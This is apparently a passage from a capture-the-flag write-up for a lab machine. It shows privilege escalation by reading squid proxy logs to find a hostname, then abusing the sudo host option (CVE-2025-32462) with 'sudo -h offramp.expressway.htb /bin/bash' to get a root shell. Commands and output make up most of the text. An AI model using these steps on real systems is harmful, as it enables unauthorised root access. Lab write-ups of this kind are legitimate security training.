
When an user is part of the proxy group, he is able to read log files of an proxy service, in a lot of cases "squid" proxy.

```
$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```

Let's list the files this group can read.

```
find / -group proxy 2>/dev/null |grep -v '/proc\|/sys/\|/run'
/var/spool/squid
/var/spool/squid/netdb.state
/var/log/squid
/var/log/squid/cache.log.2.gz
/var/log/squid/access.log.2.gz
/var/log/squid/cache.log.1
/var/log/squid/access.log.1
```

Analyze those log files.
Judging from this log file we can see an subdomain called "offramp.expressway.htb".

Since we retrieved the sudo version information earlier and know it's vulnerable to CVE-2025-32462, for this exploit to work we can utilize the retrieved host and potentially display ike's permissions on the offramp.expressway.htb host.

```
sudo -h offramp.expressway.htb -l
Matching Defaults entries for ike on offramp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ike may run the following commands on offramp:
    (root) NOPASSWD: ALL
    (root) NOPASSWD: ALL
```

He has full root perms without authentication required! 
Let's spawn an bash shell.

```
ike@expressway:/tmp$ sudo -h offramp.expressway.htb /bin/bash
root@expressway:/tmp#
```

